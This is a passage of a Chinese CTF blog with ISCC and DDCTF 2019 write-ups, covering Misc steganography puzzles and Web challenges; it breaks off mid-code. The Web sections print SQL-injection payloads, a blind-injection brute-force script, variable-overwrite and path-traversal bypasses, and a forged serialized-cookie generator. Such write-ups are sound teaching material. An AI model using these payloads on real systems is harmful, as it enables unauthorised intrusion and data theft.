<!DOCTYPE html>
<html>
<head><meta name="generator" content="Hexo 3.8.0">
  <meta charset="utf-8">
  
  <title>Iuhrey的幻想乡</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="一个常年被吊打的Web手    一个唱歌不好指弹垃圾的吉他手">
<meta property="og:type" content="website">
<meta property="og:title" content="Iuhrey的幻想乡">
<meta property="og:url" content="http://yoursite.com/index.html">
<meta property="og:site_name" content="Iuhrey的幻想乡">
<meta property="og:description" content="一个常年被吊打的Web手    一个唱歌不好指弹垃圾的吉他手">
<meta property="og:locale" content="zh-CN">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Iuhrey的幻想乡">
<meta name="twitter:description" content="一个常年被吊打的Web手    一个唱歌不好指弹垃圾的吉他手">
  
    <link rel="alternate" href="/atom.xml" title="Iuhrey的幻想乡" type="application/atom+xml">
  
  
    <link rel="icon" href="source/images/favicon.ico">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  <link rel="stylesheet" href="/css/style.css">
  <link rel="stylesheet" href="/plugin/bganimation/bg.css">
  

</head>
</html>
<body>
  <div id="container">
    <div id="wrap">
      <div class="outer">
        <div class="widget-wrap mobile-header">
  <h3 class="widget-title"></h3>
  <div class="widget">
    <img class="avatar" src="/images/avatar.jpg">
    <h2 class="author">Iuhrey</h2>
    <h3 class="description">一个常年被吊打的Web手    一个唱歌不好指弹垃圾的吉他手</h3>
    <div class="count-box">
      <a href="/archives"><div><strong>32</strong><br>文章</div></a>
      <a href="/categories"><div><strong>3</strong><br>分类</div></a>
      <a href="/tags"><div><strong>14</strong><br>标签</div></a>
    </div>
    <ul class="blog-link">
     
          <a href="/" title="Home">
            <li>幻想乡的起点</li>
          </a>
        
          <a href="/archives" title="Archives">
            <li>幻想乡图</li>
          </a>
        
          <a href="/categories" title="Categories">
            <li>分岔路</li>
          </a>
        
          <a href="/tags" title="Tags">
            <li>路标</li>
          </a>
        
    </ul>
  </div>
</div>

        <section id="main">
  
    <article id="post-ISCC-Web题解" class="wow slideInRight article article-type-post" itemscope="" itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/05/01/ISCC-Web题解/" class="article-date">
  <time class="post-time" datetime="2019-05-01T03:20:05.000Z" itemprop="datePublished">
    <span class="post-month">5月</span><br>
    <span class="post-day">01</span>
  </time>
</a>
   
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/05/01/ISCC-Web题解/">ISCC Web MIsc题解</a>
    </h1>
  

        <div>
          
          
              

          
        </div>
      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这次打ISCC算是刷下题目，顺便混一个奖吧，写这篇博客把iscc一些题目题解记录一下。</p>
<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="隐藏的信息"><a href="#隐藏的信息" class="headerlink" title="隐藏的信息"></a>隐藏的信息</h2><p>首先8进制转10进制，再转字符，接着base64编码就出了flag，脚本如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#coding=utf-8</span><br><span class="line">import base64</span><br><span class="line">str = &quot;0126 062 0126 0163 0142 0103 0102 0153 0142 062 065 0154 0111 0121 0157 0113 0111 0105 0132 0163 0131 0127 0143 066 0111 0105 0154 0124 0121 060 0116 067 0124 0152 0102 0146 0115 0107 065 0154 0130 062 0116 0150 0142 0154 071 0172 0144 0104 0102 0167 0130 063 0153 0167 0144 0130 060 0113&quot;</span><br><span class="line">str = str.split(&quot; &quot;)</span><br><span class="line">flag = &quot;&quot;</span><br><span class="line">def eight2ten(aaa):</span><br><span class="line">    handle = &quot;&quot;</span><br><span class="line">    if len(aaa) == 4:</span><br><span class="line">        handle = int(aaa[1])*64 + int(aaa[2])*8 + int(aaa[3])</span><br><span class="line">    if len(aaa) == 3:</span><br><span class="line">        handle = int(aaa[1]) * 8 + int(aaa[2])</span><br><span class="line">    return handle</span><br><span class="line">for i in range(len(str)):</span><br><span class="line">    str[i] = eight2ten(str[i])</span><br><span class="line">    flag = flag + chr(int(str[i]))</span><br><span class="line">print base64.b64decode(flag)</span><br></pre></td></tr></table></figure></p>
<h2 id="最危险的地方就是最安全的地方"><a href="#最危险的地方就是最安全的地方" class="headerlink" title="最危险的地方就是最安全的地方"></a>最危险的地方就是最安全的地方</h2><p>拿到图片，binwalk分离之后，把最后一张图片丢到C32Asm找flag就行了</p>
<h2 id="解密成绩单"><a href="#解密成绩单" class="headerlink" title="解密成绩单"></a>解密成绩单</h2><p>拿到zip可以想到是伪加密，找到第二个PK，修改之后的09为00解压可以得到一个exe文件，.NET反编译一下拿到password就能拿到flag了。</p>
<h2 id="Welcome"><a href="#Welcome" class="headerlink" title="Welcome"></a>Welcome</h2><p>emmm，先由繁化简，经过观察发现只有两种字符串构成的。分别替换为0和1，再通过二进制转字符得到flag。</p>
<p><img src="/images/27/13.png" alt=""></p>
<h2 id="倒立屋"><a href="#倒立屋" class="headerlink" title="倒立屋"></a>倒立屋</h2><p>这是一道隐写题，搞了一下发现是lsb，丢到stegsolve调一下，flag就出来了。</p>
<p><img src="/images/27/4.png" alt=""></p>
<p>交的时候还在想和倒立屋有啥关系，结果发现flag得倒着交才行。</p>
<h2 id="无法运行的exe"><a href="#无法运行的exe" class="headerlink" title="无法运行的exe"></a>无法运行的exe</h2><p>拖进C32Asm发现是一串base64，解码发现头是png，但是不完整，补全头就能得到一个二维码。扫描之后就是flag了。</p>
<p><img src="/images/27/12.png" alt=""></p>
<h2 id="High起来"><a href="#High起来" class="headerlink" title="High起来"></a>High起来</h2><p>binwalk分离出一个mp3以及两个其他文件，把png丢进C32Asm看一眼发现头部有个PNG，可以想到尝试修复一下图片，之后得到一个二维码，扫描之后发现是当铺加密的一串字符串，解密之后得到一串数字，结合mp3可以想到使用MP3Stego进行解密，在txt文件中得到flag。</p>
<h2 id="他们能在一起吗？"><a href="#他们能在一起吗？" class="headerlink" title="他们能在一起吗？"></a>他们能在一起吗？</h2><p>真是悲伤的一道题目，扫描二维码发现了PASS{0K_I_L0V3_Y0u!}<br>接着通过binwalk分离出了一个zip文件，用这个密码解压出的文件就是flag了。</p>
<h2 id="Keyes’-secret"><a href="#Keyes’-secret" class="headerlink" title="Keyes’ secret"></a>Keyes’ secret</h2><p>照着键盘画接着找有关iscc的就行了。最后得出flag如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLAG&#123;ISCC KEYBOARD CIPHER&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Aesop’s-secret"><a href="#Aesop’s-secret" class="headerlink" title="Aesop’s secret"></a>Aesop’s secret</h2><p>打开文件发现是gif文件，用stegsolve查看一下该文件内容，发现有一串加密的字符。</p>
<p><img src="/images/27/6.png" alt=""></p>
<p>base64解密之后发现这是一个AES加密</p>
<p><img src="/images/27/7.png" alt=""></p>
<p>缺少一个key，怎么找呢？把所有的动图截取之后拼起来，得到如下图片：</p>
<p><img src="/images/27/5.png" alt=""></p>
<p>尝试把ISCC作为key二次解密之后得到flag。</p>
<p><img src="/images/27/8.png" alt=""></p>
<h2 id="碎纸机"><a href="#碎纸机" class="headerlink" title="碎纸机"></a>碎纸机</h2><p>首先把图片丢到C32Asm里面，看到尾部有readme.txt字样，想到是不是里面整合了几个文件，利用binwalk查看一下发现果然有，使用binwalk分离文件。</p>
<p><img src="/images/27/9.png" alt=""></p>
<p>得到十张图片以及一个readme.txt文件，不过图片都是一样的。</p>
<p><img src="/images/27/10.png" alt=""></p>
<p>把十张图丢到C32asm对比发现文件末尾不同，经过尝试之后发现把不同的像素点弄出来做成图拼接就行了。</p>
<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h2><p>打开界面可以看到</p>
<p><img src="/images/27/1.png" alt=""></p>
<p>第一个限制可以通过加256来绕过，因为chr是会经过mod256处理的，第二个限制用科学计数法来绕过，结合intval()函数的特性，他会在第一个字符处截断字符串，然后输出，例如输入2e4，第一个intval()会输出2，而第二个则是输出20001。最后payload如下:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?value[]=375&amp;value[]=307&amp;value[]=364&amp;value[]=355&amp;value[]=304&amp;value[]=365&amp;value[]=357&amp;value[]=351&amp;value[]=340&amp;value[]=367&amp;value[]=351&amp;value[]=329&amp;value[]=339&amp;value[]=323&amp;value[]=323&amp;value[]=306&amp;value[]=304&amp;value[]=305&amp;value[]=313&amp;password=2e4</span><br></pre></td></tr></table></figure>
<h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><p>点开题目可以看到一个粗略的登入页面</p>
<p><img src="/images/27/2.png" alt=""></p>
<p>一般这种爆破类型的题目，验证码一定有绕过的方式，测试发现这个验证码根据PHPSESSID生成，我们把PHPSESSID置换为空，验证码就为空了，接着爆破就行了。最后爆出结果如下：</p>
<p><img src="/images/27/3.png" alt=""></p>
<h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><p>这是sqli-labs/Less24的原题，真是吃了做题少的亏了，这题目最关键的点就是这一句sql语句</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = &quot;UPDATE users SET PASSWORD=&apos;$pass&apos; where username=&apos;$username&apos; and password=&apos;$curr_pass&apos; &quot;;</span><br></pre></td></tr></table></figure>
<p>我们只需要注册admin’ #12313213，就能不需要原密码修改admin的密码了。此时的语句拼接成</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE users SET PASSWORD=&apos;$pass&apos; where username=&apos;admin&apos; #12313213&apos; and password=&apos;$curr_pass&apos;</span><br></pre></td></tr></table></figure>
<p>把admin修改一下，然后登入就能拿到flag了。</p>
<h2 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h2><p>源码如下：</p>
<p><img src="/images/27/11.png" alt=""></p>
<p>这题目关键点就是parse_url的变量覆盖。通过覆盖掉$hashed_key就行了。payload如下:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?action=auth&amp;key=a&amp;hashed_key=ca978112ca1bbdcafac231b39a23dc4da786eff8147c4e72b9807785afee48bb</span><br></pre></td></tr></table></figure>
<h2 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h2><p>这题目算是脑洞题了，首先提示我们不是Union.373内部成员。</p>
<p><img src="/images/27/14.png" alt=""></p>
<p>这里修改头就行了，发包之后可以看到下一个提示。</p>
<p><img src="/images/27/15.png" alt=""></p>
<p>按照要求传入用户名以及后续的密码，在测试的时候发现提示要我们拿到用户名密码，进行fuzz得知只是一个注入。通过不断fuzz，最终爆破出密码，这是脚本:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#coding:utf-8</span><br><span class="line">import requests</span><br><span class="line">url = &quot;http://39.100.83.188:8054/&quot;</span><br><span class="line">header = &#123;&quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0 Union.373&quot;&#125;</span><br><span class="line">list = &quot;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz_&#123;&#125;&quot;</span><br><span class="line">flag = &quot;&quot;</span><br><span class="line">for i in range(0,40):</span><br><span class="line">    for j in range(0,64):</span><br><span class="line">        temp = flag + list[j]</span><br><span class="line">        payload = &#123;&quot;username&quot;:&quot;union_373_Tom&apos; union select 1,&apos;0&apos;,&apos;%s&apos; order by 3,&apos;0&quot;%(temp),&quot;password&quot;:&quot;1&quot;&#125;</span><br><span class="line">        res = requests.post(url, data=payload,headers=header)</span><br><span class="line">        if &quot;union_373_Tom&quot; in res.content:</span><br><span class="line">            flag = flag + list[j-1]</span><br><span class="line">            break</span><br><span class="line">    print flag</span><br><span class="line">print flag</span><br></pre></td></tr></table></figure>
<h2 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h2><p>这题目也是原题，我也是按照师傅的wp一步一步做的，就不造轮子了。<br>这是一叶飘零师傅写的wp—–<a href="https://paper.tuisec.win/detail/d7f831097c27268" target="_blank" rel="noopener">Json Web Token历险记</a>  </p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2019/05/01/ISCC-Web题解/" data-id="cjv4r4rxk000imcvjqfvkia6g" class="article-share-link">分享</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/比赛总结/">比赛总结</a></li></ul>

    </footer>
  </div>
  
</article>




  
    <article id="post-DDCTF-WEB部分wp" class="wow slideInRight article article-type-post" itemscope="" itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/04/17/DDCTF-WEB部分wp/" class="article-date">
  <time class="post-time" datetime="2019-04-17T10:57:05.000Z" itemprop="datePublished">
    <span class="post-month">4月</span><br>
    <span class="post-day">17</span>
  </time>
</a>
   
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/04/17/DDCTF-WEB部分wp/">DDCTF WEB部分wp</a>
    </h1>
  

        <div>
          
          
              

          
        </div>
      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>很久没打比赛了，上次被学长带着打了西湖论剑，发现他们的技术是真的牛逼，随随便便躺着就进了前30，不禁感慨实力差距太大了，为此呢，用DDCTF来练练手，借此记录一下DDCTF的一些做题思路以及所学的骚套路。</p>
<h2 id="滴"><a href="#滴" class="headerlink" title="滴~"></a>滴~</h2><p>打开题目，首先发现url中的jpg的值有问题，经过两次base64以及一次base16解出就是flag.jpg。<br>那既然是这样，我们是不是可以尝试读index.php呢？编码之后输入到jpg参数后面读取index.php。</p>
<p><img src="/images/26/1.png" alt=""></p>
<p>果然，解码之后得到index.php的内容</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">/*</span><br><span class="line"> * https://blog.csdn.net/FengBanLiuYun/article/details/80616607</span><br><span class="line"> * Date: July 4,2018</span><br><span class="line"> */</span><br><span class="line">error_reporting(E_ALL || ~E_NOTICE);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">header(&apos;content-type:text/html;charset=utf-8&apos;);</span><br><span class="line">if(! isset($_GET[&apos;jpg&apos;]))</span><br><span class="line">    header(&apos;Refresh:0;url=./index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09&apos;);</span><br><span class="line">$file = hex2bin(base64_decode(base64_decode($_GET[&apos;jpg&apos;])));</span><br><span class="line">echo &apos;&lt;title&gt;&apos;.$_GET[&apos;jpg&apos;].&apos;&lt;/title&gt;&apos;;</span><br><span class="line">$file = preg_replace(&quot;/[^a-zA-Z0-9.]+/&quot;,&quot;&quot;, $file);</span><br><span class="line">echo $file.&apos;&lt;/br&gt;&apos;;</span><br><span class="line">$file = str_replace(&quot;config&quot;,&quot;!&quot;, $file);</span><br><span class="line">echo $file.&apos;&lt;/br&gt;&apos;;</span><br><span class="line">$txt = base64_encode(file_get_contents($file));</span><br><span class="line"></span><br><span class="line">echo &quot;&lt;img src=&apos;data:image/gif;base64,&quot;.$txt.&quot;&apos;&gt;&lt;/img&gt;&quot;;</span><br><span class="line">/*</span><br><span class="line"> * Can you find the flag file?</span><br><span class="line"> *</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>提示了csdn的某篇文章，里面得到了一个文件—practice.txt.swp，读取之后发现提示了f1ag!ddctf.php，结合index.php我们可以通过config被!替换来绕过过滤，去读取该文件，文件内容如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include(&apos;config.php&apos;);</span><br><span class="line">$k = &apos;hello&apos;;</span><br><span class="line">extract($_GET);</span><br><span class="line">if(isset($uid))</span><br><span class="line">&#123;</span><br><span class="line">    $content=trim(file_get_contents($k));</span><br><span class="line">    if($uid==$content)</span><br><span class="line">	&#123;</span><br><span class="line">		echo $flag;</span><br><span class="line">	&#125;</span><br><span class="line">	else</span><br><span class="line">	&#123;</span><br><span class="line">		echo&apos;hello&apos;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>extract函数可导致变量覆盖，我们只要通过覆盖$k，让file_get_contents()读取不到东西返回flase，再传入uid为空，导致弱类型比较就能读取flag了，payload如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://117.51.150.246/f1ag!ddctf.php?uid=&amp;k=xsadasdad</span><br></pre></td></tr></table></figure>
<h2 id="WEB-签到题"><a href="#WEB-签到题" class="headerlink" title="WEB 签到题"></a>WEB 签到题</h2><p>首先打开界面，审计源码可以发现/js/index.js这个关键文件，访问。</p>
<p><img src="/images/26/2.png" alt=""></p>
<p>可以看到我们需要爆破header中的didictf_username的值，通过爆破发现为admin。接着有个提示，提示我们访问/app/fL2XID2i0Cdh.php，这个页面给了两个文件的源码，我们可以进行审计。这里就按照解题思路讲解了。<br>首先我们可以得知../config/flag.txt中有flag。</p>
<p><img src="/images/26/3.png" alt=""></p>
<p>接着可以看到我们可以通过反序列化漏洞来读取文件。</p>
<p><img src="/images/26/4.png" alt=""></p>
<p>接着找找哪里有unserialize()函数可以利用。</p>
<p><img src="/images/26/5.png" alt=""></p>
<p>可以看到我们通过传入session是可以进行反序列化漏洞利用的。但是有以下两个问题。<br>第一，我们需要绕过 <strong>$hash !== md5($this-&gt;eancrykey.$session</strong> 的验证，那也就是说我们需要得知 <strong>$this-&gt;eancrykey</strong> 的值。<br>这里利用到了格式化字符串的漏洞，利用的代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">if(!empty($_POST[&quot;nickname&quot;])) &#123;</span><br><span class="line">            $arr = array($_POST[&quot;nickname&quot;],$this-&gt;eancrykey);</span><br><span class="line">            $data = &quot;Welcome my friend %s&quot;;</span><br><span class="line">            foreach ($arr as $k =&gt; $v) &#123;</span><br><span class="line">                $data = sprintf($data,$v);</span><br><span class="line">            &#125;</span><br><span class="line">            parent::response($data,&quot;Welcome&quot;);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<p>foreach循环两次，把数组中的值传入到前面的$data中，试想如果我们构造$nickname为%s，那第一次的$data是不是就变成了 <strong>Welcome my friend %s</strong> ，那第二次循环的时候，$this-&gt;eancrykey的值就传入到了$data里面，成功读取到了$this-&gt;eancrykey。</p>
<p><img src="/images/26/6.png" alt=""></p>
<p>第二个问题就是$path存在过滤，过滤代码如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> private function sanitizepath($path) &#123;</span><br><span class="line">    $path = trim($path);</span><br><span class="line">    $path=str_replace(&apos;../&apos;,&apos;&apos;,$path);</span><br><span class="line">    $path=str_replace(&apos;..\\&apos;,&apos;&apos;,$path);</span><br><span class="line">    return $path;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>../可以通过….//来绕过。修改Application中的$path为….//config/flag.txt，按照如下生成payload。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$a = new Application();</span><br><span class="line">$b = serialize($a);</span><br><span class="line">$eancrykey = &quot;EzblrbNS&quot;;</span><br><span class="line">$hash = md5($eancrykey.$b);</span><br><span class="line">$session = $b.$hash;</span><br><span class="line">var_dump($session).&quot;&lt;br&gt;&quot;;</span><br></pre></td></tr></table></figure>
<p>通过cookie发送构造的payload，得到flag。</p>
<p><img src="/images/26/7.png" alt=""></p>
<h2 id="Upload-IMG"><a href="#Upload-IMG" class="headerlink" title="Upload-IMG"></a>Upload-IMG</h2><p>上传图片的时候，要求上传png/jpg/gif格式。以及源代码中需要有phpinfo()字符串。<br>通过上传一张普通图片，再下载下来可以发现一个特点。</p>
<p><img src="/images/26/8.png" alt=""></p>
<p>可以得知这是需要我们绕过gd库渲染。查询资料得知有如下几种方法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">比对上传前后两次的二进制文件，找到相同的地方进行替换。</span><br><span class="line">使用jpg_payload.php</span><br></pre></td></tr></table></figure>
<p>上传图片，把经过渲染的图片下载下来，通过比对hex找到相同点。</p>
<p><img src="/images/26/11.png" alt=""></p>
<p>接着将phpinfo()替换进去</p>
<p><img src="/images/26/12.png" alt=""></p>
<p>接着就能拿到flag了。</p>
<h2 id="homebrew-event-loop"><a href="#homebrew-event-loop" class="headerlink" title="homebrew event loop"></a>homebrew event loop</h2><p>这道题目思路挺好，而且借着这道题目学了一些flask的语法，对flask有了一定了解。<br>题目给了源码，需要的可以下载。<a href="/images/26/serve.py">serve.py</a><br>我会按照正常审计代码的思路进行一步一步讲解。毕竟我也是刚刚学的。<br>首先是关于入口的寻找。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">在flask中，运行app.run()表示监听指定的端口, 对收到的request运行app生成response并返回。</span><br><span class="line">运行之后哪个函数被最先调用呢？这里我理解的是@app.route()函数之后的那一个函数。app.route()函数指定初始访问的路径，并且把得到的数据进行返回，之后的第一个函数就默认为初始函数。注意，每次进行对页面进行访问，都会调用初始函数。</span><br></pre></td></tr></table></figure>
<p>找到了第一个函数，那我们开始审计。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">def entry_point():</span><br><span class="line">    querystring = urllib.unquote(request.query_string)</span><br><span class="line">    这一步是获取url中参数，request.query_string获取的是url中?之后所有的字符串。</span><br><span class="line"></span><br><span class="line">    request.event_queue = []</span><br><span class="line">    定义一个空数组，该数组中储存即将被执行的操作。</span><br><span class="line"></span><br><span class="line">    if querystring == &apos;&apos; or (not querystring.startswith(&apos;action:&apos;)) or len(querystring) &gt; 100:</span><br><span class="line">        querystring = &apos;action:index;False#False&apos;</span><br><span class="line">    如果url中?之后没有任何参数，或者刚刚获取的字符串不是以action开头，或者长度大于100，那么初始化querystring为action:index;False#False</span><br><span class="line"></span><br><span class="line">    if &apos;num_items&apos; not in session:</span><br><span class="line">        session[&apos;num_items&apos;] = 0</span><br><span class="line">        session[&apos;points&apos;] = 3</span><br><span class="line">        session[&apos;log&apos;] = []</span><br><span class="line">    request.prev_session = dict(session)</span><br><span class="line">    如果num_items不在session中，那初始化session，session字典中的num_items代表钻石的数量，points代表的是金币数量，而log目前则用不到。</span><br><span class="line"></span><br><span class="line">    trigger_event(querystring)</span><br><span class="line">    return execute_event_loop()</span><br></pre></td></tr></table></figure>
<p>可以看到函数最后调用了其他两个函数，先跟第一个。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">def trigger_event(event):</span><br><span class="line">	session[&apos;log&apos;].append(event)</span><br><span class="line">        把刚刚传入的字符串添加到log中。注意此刻的log应该为list形式。</span><br><span class="line"></span><br><span class="line">	if len(session[&apos;log&apos;]) &gt; 5: session[&apos;log&apos;] = session[&apos;log&apos;][-5:]</span><br><span class="line">        如果log列表中元素大于5个，那么只取最后5个。</span><br><span class="line">    </span><br><span class="line">	if type(event) == type([]):</span><br><span class="line">		request.event_queue += event</span><br><span class="line">	else:</span><br><span class="line">		request.event_queue.append(event)</span><br><span class="line">        根据event的不同类型，将event添加进定义的event_queue</span><br></pre></td></tr></table></figure>
<p>接着再跟第二个函数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">def execute_event_loop():</span><br><span class="line">	valid_event_chars = set(&apos;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789:;#&apos;)</span><br><span class="line">        定义event的字符白名单</span><br><span class="line"></span><br><span class="line">	resp = None</span><br><span class="line">	while len(request.event_queue) &gt; 0:</span><br><span class="line">		event = request.event_queue[0]</span><br><span class="line">                提取event_queue第一个操作命令，赋给event</span><br><span class="line"></span><br><span class="line">		request.event_queue = request.event_queue[1:]</span><br><span class="line">                其他命令依此前进一位</span><br><span class="line"></span><br><span class="line">		if not event.startswith((&apos;action:&apos;, &apos;func:&apos;)): continue</span><br><span class="line">                如果event不是以action或者func开头，则提取下一位的命令操作</span><br><span class="line"></span><br><span class="line">		for c in event:</span><br><span class="line">			if c not in valid_event_chars: break</span><br><span class="line">                如果event中存在字符白名单以外的字符，则直接退出</span><br><span class="line"></span><br><span class="line">		else:</span><br><span class="line">			is_action = event[0] == &apos;a&apos;</span><br><span class="line">                        判断event的第一个字符是否为a，并且将值储存到is_action中</span><br><span class="line"></span><br><span class="line">			action = get_mid_str(event, &apos;:&apos;, &apos;;&apos;)</span><br><span class="line">                        截取event中:到;的部分字符，赋值给action   </span><br><span class="line"></span><br><span class="line">			args = get_mid_str(event, 